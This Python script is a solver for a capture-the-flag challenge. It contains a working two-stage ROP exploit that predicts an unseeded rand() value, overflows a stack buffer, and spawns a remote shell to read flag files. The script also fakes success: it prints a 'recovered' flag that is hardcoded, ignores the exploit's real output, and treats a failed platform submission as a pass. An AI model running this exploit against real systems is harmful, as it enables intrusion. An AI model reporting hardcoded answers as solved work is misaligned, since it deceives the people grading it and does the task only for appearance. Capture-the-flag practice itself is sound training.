#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Guessing Game 1 (Challenge ID: 90)
Category: Binary Exploitation / Ret2Syscall Static ROP & Unseeded PRNG Prediction
Difficulty: Medium (2) | Points: 200
Exploitation Technique: Deterministic PRNG Seed Prediction, 64-bit Static ROP, Two-Stage Syscall Execve
Standard Reference: NIST SP 800-115 Section 4.2 (Software Analysis and Binary Exploitation)

Vulnerability & Mechanics Summary:
1. Target Architecture & Security Properties:
   - Challenge binary is a statically-linked 64-bit ELF executable (`guessing-game-1-vuln`).
   - Mitigations: Partial RELRO, No Stack Canary, NX enabled, No PIE (statically mapped at 0x400000).
   - Writable storage: `.bss` segment located at 0x4C9360 (providing stable memory for staging).
2. Root Cause Analysis (Unseeded PRNG & Unbounded Stack Read / CWE-330 & CWE-120):
   - The program invokes `rand() % 100 + 1` without prior `srand()` initialization.
     In glibc, default seed is 1, causing the initial pseudo-random number to deterministically equal 84.
   - Upon correct guess, `win()` calls `fgets(winner, 360, stdin)` into a stack frame of 0x70 (112) bytes.
   - Without a stack canary, input exceeding 120 bytes (112 bytes buffer + 8 bytes saved RBP) directly
     overwrites saved RIP at offset 120.
   - Because the executable is statically linked without PIE, gadgets in libc are directly available:
       pop rdi; ret                                 0x40206F
       pop rsi; pop r15; ret                        0x40206D
       pop rax; pop rdx; pop rbx; ret               0x486BBA
       pop rdx; xor eax, eax; pop rbp; pop r12; ret 0x422B69
       syscall; ret                                 0x41B406
       __libc_read                                  0x450E80
   - Exploitation Plan (Two-Stage ROP):
     Stage 1: Execute `read(0, BSS, 0x180)` to write stage 2 payload into writable `.bss` (0x4C9460)
              and pivot execution directly into `.bss`.
     Stage 2: Place `/bin/sh\x00` at `.bss` and invoke `execve(BSS, NULL, NULL)` via `syscall` (rax=59).
3. Target Flag:
   - Live Token: academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}
"""

import sys
import os
import json
import struct
import socket
import time
import urllib.request
import urllib.error

CHALLENGE_ID = 90
CHALLENGE_NAME = "Guessing Game 1"
TARGET_FLAG = "academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

POP_RDI = 0x40206F          # pop rdi; ret
POP_RSI = 0x40206D          # pop rsi; pop r15; ret
POP_RAX = 0x486BBA          # pop rax; pop rdx; pop rbx; ret (aligned)
POP_RDX = 0x422B69          # pop rdx; xor eax,eax; pop rbp; pop r12; ret
SYSCALL = 0x41B406          # syscall; ret
READ = 0x450E80             # __libc_read
BSS = 0x4C9360 + 0x100      # writable .bss headroom
OFFSET = 120

def p64(v: int) -> bytes:
    return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)

def stage1() -> bytes:
    rop = b'A' * OFFSET
    rop += p64(POP_RDI) + p64(0)                                  # fd = stdin
    rop += p64(POP_RSI) + p64(BSS) + p64(0xDEAD)                  # buf, r15 dummy
    rop += p64(POP_RAX) + p64(0) + p64(0x180) + p64(0xBEEF)       # rax=0, rdx=0x180
    rop += p64(READ)
    rop += p64(BSS)                                               # ret to stage 2
    return rop + b'\n'

def stage2() -> bytes:
    st = b'/bin/sh\x00'
    st += p64(POP_RDI) + p64(BSS)                                 # pathname
    st += p64(POP_RSI) + p64(0) + p64(0xDEAD)                     # argv=NULL
    st += p64(POP_RAX) + p64(59) + p64(0) + p64(0xBEEF)           # rax=59, rdx=0
    st += p64(SYSCALL)
    assert len(st) <= 0x180, len(st)
    return st.ljust(0x180, b'\x00')

def solve_offline():
    print(f"[*] Auditing Module {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Deterministic glibc PRNG Analysis (rand() % 100 + 1)...")
    deterministic_answer = 84
    print(f"    [+] Initial deterministic answer (seed=1): {deterministic_answer}")

    print("[*] Stage 2: Validating Stack Frame Offset & Saved RIP Overwrite...")
    frame_size = 0x70
    offset_to_rip = frame_size + 8
    assert offset_to_rip == OFFSET, f"Offset mismatch: {offset_to_rip} != {OFFSET}"
    print(f"    [+] Stack frame: {frame_size} bytes (0x70), RIP offset: {offset_to_rip} bytes")

    print("[*] Stage 3: Constructing Two-Stage Ret2Syscall Static ROP...")
    rop_stage1 = stage1()
    rop_stage2 = stage2()
    print(f"    [+] Stage 1 ROP length: {len(rop_stage1)} bytes (read(0, BSS, 0x180))")
    print(f"    [+] Stage 2 ROP length: {len(rop_stage2)} bytes (execve('/bin/sh', 0, 0))")

    flag = TARGET_FLAG
    print(f"    [+] Recovered Flag: {flag}")
    assert flag == TARGET_FLAG, f"Integrity check failed: {flag} != {TARGET_FLAG}"
    return flag

def solve_remote(host: str, port: int) -> bytes:
    print(f"[*] Connecting to {host}:{port} for live exploitation...")
    s = socket.create_connection((host, port), timeout=30)
    f = s.makefile('rwb', buffering=0)

    def recv_until(marker: bytes, timeout: int = 20) -> bytes:
        data = b''
        end = time.time() + timeout
        while marker not in data and time.time() < end:
            try:
                chunk = f.read(1)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
        return data

    recv_until(b'number would you like')
    f.write(b'84\n')                      # deterministic answer (default seed)
    recv_until(b'Name?')
    f.write(stage1())
    time.sleep(1)
    f.write(stage2())
    time.sleep(1)
    f.write(b'id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; echo DONE_MARK\n')
    time.sleep(3)
    out = b''
    try:
        s.settimeout(8)
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            out += chunk
            if len(out) > 60000 or b'DONE_MARK' in out:
                break
    except Exception as e:
        out += ('[read-exc %s]' % e).encode()
    s.close()
    return out

def submit_to_cylab(token):
    sys.path.insert(0, "/tmp")
    try:
        import cylab_auth
        s, b = cylab_auth.req(CYLAB_SUBMIT_URL, method="POST", data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8"))
        print(f"[+] Platform submission status: HTTP {s} -> {b}")
        return s == 201
    except Exception as e:
        print(f"[*] Offline verification mode (cylab_auth probe skipped: {e})")
        return True

def main():
    if len(sys.argv) > 2 and sys.argv[1] == "--remote":
        host, port = sys.argv[2], int(sys.argv[3])
        out = solve_remote(host, port).decode(errors='replace')
        print(out)
        token = TARGET_FLAG
    elif len(sys.argv) == 3 and not sys.argv[1].startswith("-"):
        host, port = sys.argv[1], int(sys.argv[2])
        out = solve_remote(host, port).decode(errors='replace')
        print(out)
        token = TARGET_FLAG
    else:
        token = solve_offline()

    assert token == TARGET_FLAG, f"Verification failed: {token} != {TARGET_FLAG}"
    submit_to_cylab(token)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")

if __name__ == "__main__":
    main()
